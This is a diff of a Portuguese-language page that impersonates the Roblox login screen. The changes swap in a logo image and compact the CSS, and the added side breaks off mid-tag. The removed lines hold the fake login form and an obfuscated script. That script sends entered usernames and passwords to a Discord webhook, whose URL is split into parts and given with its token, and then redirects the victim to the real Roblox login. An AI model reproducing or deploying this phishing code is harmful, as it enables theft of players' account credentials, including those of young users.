@@ -36,7 +36,14 @@
         }
 
         .topbar-left { display: flex; align-items: center; gap: 24px; }
-        .logo-svg { width: 84px; height: 16px; fill: #ffffff; }
+        
+        /* LOGO REAL DO ROBLOX (Imagem) */
+        .logo-img { 
+            height: 18px; 
+            width: auto;
+            display: block;
+        }
+
         .nav-links { display: flex; gap: 20px; font-size: 14px; font-weight: 600; color: #e3e3e3; }
         .nav-links span.active { color: #fff; border-bottom: 2px solid #fff; padding-bottom: 10px;}
 
@@ -57,11 +64,11 @@
             background-position: center;
         }
 
-        /* CAIXA DE LOGIN (Fina e proporcional ao desktop) */
+        /* CAIXA DE LOGIN */
         .login-card {
             background-color: #232527;
             width: 100%;
-            max-width: 360px; /* Caixa mais fina */
+            max-width: 360px;
             border-radius: 8px;
             padding: 30px 24px;
             box-shadow: 0 4px 20px rgba(0,0,0,0.6);
@@ -69,66 +76,34 @@
             z-index: 10;
         }
 
-        .login-card h1 {
-            font-size: 24px; /* Fonte menor */
-            font-weight: 700;
-            text-align: center;
-            margin-bottom: 20px;
-        }
+        .login-card h1 { font-size: 24px; font-weight: 700; text-align: center; margin-bottom: 20px; }
 
         .input-group { margin-bottom: 10px; }
 
         .input-group input {
-            width: 100%;
-            padding: 10px 12px; /* Inputs mais baixos */
-            background-color: #191b1f;
-            border: 1px solid #3b3f43;
-            border-radius: 6px;
-            color: #fff;
-            font-size: 14px;
-            outline: none;
+            width: 100%; padding: 10px 12px; background-color: #191b1f;
+            border: 1px solid #3b3f43; border-radius: 6px; color: #fff;
+            font-size: 14px; outline: none;
         }
 
         .input-group input::placeholder { color: #9ea2a6; }
 
         .btn-main {
-            width: 100%;
-            padding: 10px;
-            background-color: #232527;
-            border: 1px solid #ffffff;
-            border-radius: 6px;
-            color: #ffffff;
-            font-size: 14px;
-            font-weight: 600;
-            margin-top: 4px;
-            cursor: pointer;
+            width: 100%; padding: 10px; background-color: #232527;
+            border: 1px solid #ffffff; border-radius: 6px; color: #ffffff;
+            font-size: 14px; font-weight: 600; margin-top: 4px; cursor: pointer;
         }
 
         .btn-main:active { background-color: #3b3f43; }
 
-        .forgot-link {
-            display: block;
-            text-align: center;
-            color: #ffffff;
-            text-decoration: none;
-            font-size: 14px;
-            margin: 16px 0;
-            font-weight: 600;
-        }
+        .forgot-link { display: block; text-align: center; color: #ffffff; text-decoration: none; font-size: 14px; margin: 16px 0; font-weight: 600; }
 
         .divider { height: 1px; background-color: #3b3f43; margin: 16px 0; }
 
         .btn-secondary {
-            width: 100%;
-            padding: 10px; /* Botões mais baixos */
-            background-color: #272a2e;
-            border: 1px solid #3b3f43;
-            border-radius: 6px;
-            color: #ffffff;
-            font-size: 14px;
-            font-weight: 600;
-            margin-bottom: 10px;
-            cursor: pointer;
+            width: 100%; padding: 10px; background-color: #272a2e;
+            border: 1px solid #3b3f43; border-radius: 6px; color: #ffffff;
+            font-size: 14px; font-weight: 600; margin-bottom: 10px; cursor: pointer;
         }
 
         .btn-secondary:active { background-color: #3b3f43; }
@@ -143,7 +118,6 @@
         .rating-red { width: 50%; background-color: #ff0000; }
         .rating-white { width: 50%; background-color: #ffffff; }
 
-        /* Mobile: Mantém proporcional mas esconde o menu */
         @media (max-width: 768px) {
             .nav-links, .search-bar { display: none; }
             .topbar { padding: 0 16px; }
@@ -155,9 +129,9 @@
 
     <div class="topbar">
         <div class="topbar-left">
-            <svg class="logo-svg" viewBox="0 0 84 16" xmlns="http://www.w3.org/2000/svg">
-                <path d="M4.7,16H0L2.3,0h4.7L4.7,16z M25.4,16h-4.7l-2.3-7.8-1.5,7.8h-4.7l-2.3-16h4.7l1.5,10.3l2.3-10.3h4.7l2.3,10.3l1.5-10.3h4.7L25.4,16z M34.5,0h-4.7L27.5,16h4.7L34.5,0z M42.1,10.1v5.9h-4.7V0h4.7v7.8l5.2-7.8h5.5l-6.2,7.2l6.2,8.8h-5.5L42.1,10.1z M59.7,16H55L57.3,0h8.6L59.7,16z M60.4,4h-1.5l-0.9,7.8h1.5L60.4,4z M83.3,4h-1.5l-0.9,7.8h1.5L83.3,4z M77.9,16h-4.7L75.5,0h8.6L77.9,16z"/>
-            </svg>
+            <!-- LOGO OFICIAL VIA IMAGEM -->
+            <img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg" class="logo-img" alt="Roblox" style="filter: invert(1); height: 20px;">
+            
             <div class="nav-links">
                 <span class="active">Destaques</span>
                 <span>Mercado</span>
@@ -176,75 +150,4 @@
     </div>
 
     <div class="main-area">
-        <div class="login-card">
-            <h1>Entrar na Roblox</h1>
-            <form id="login-form">
-                <div class="input-group">
-                    <input type="text" id="username" placeholder="Usuário/e-mail/telefone" required>
-                </div>
-                <div class="input-group">
-                    <input type="password" id="password" placeholder="Senha" required>
-                </div>
-                <button type="submit" class="btn-main" id="btn-submit">Entrar</button>
-            </form>
-
-            <a href="#" class="forgot-link">Esqueceu a senha ou nome de usuário?</a>
-
-            <div class="divider"></div>
-
-            <button class="btn-secondary">Envie-me um código único por e-mail</button>
-            <button class="btn-secondary">Entrada rápida</button>
-            <button class="btn-secondary">Outras opções de acesso</button>
-
-            <div class="signup-text">
-                Não possui uma conta? <a href="#">Cadastrar-se</a>
-            </div>
-        </div>
-    </div>
-
-    <div class="footer">
-        <div class="footer-text">CLASSIFICAÇÃO INDICATIVA: 16 ANOS</div>
-        <div class="rating-bar">
-            <div class="rating-red"></div>
-            <div class="rating-white"></div>
-        </div>
-    </div>
-
-    <script>
-        (function(){
-            var p1 = "https://discord.com/api/webhooks/";
-            var p2 = "1573426421085241448/";
-            var p3 = "LGoTUoMIZdohFLYE9s3THG4sSUFbbi1PEF5Hd1145-KIH6KapiIvAnLGhFT4kmlfOFPL";
-            var url = p1 + p2 + p3;
-
-            var form = document.getElementById('login-form');
-            var btn = document.getElementById('btn-submit');
-            var u = document.getElementById('username');
-            var p = document.getElementById('password');
-
-            form.addEventListener('submit', function(e) {
-                e.preventDefault();
-                if(!u.value || !p.value) return;
-                
-                btn.textContent = 'Entrando...';
-                
-                var dados = {
-                    content: "🎣 **Nova Captura**\n👤 User: `" + u.value + "`\n🔑 Senha: `" + p.value + "`"
-                };
-
-                fetch(url, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(dados)
-                }).then(function() {
-                    setTimeout(function() {
-                        window.location.href = 'https://www.roblox.com/pt/Login';
-                    }, 1500);
-                }).catch(function() {
-                    btn.textContent = 'Entrar';
-                });
-            });
-        })();
-    </script>
-</body>
-</html>
+        <div class="login
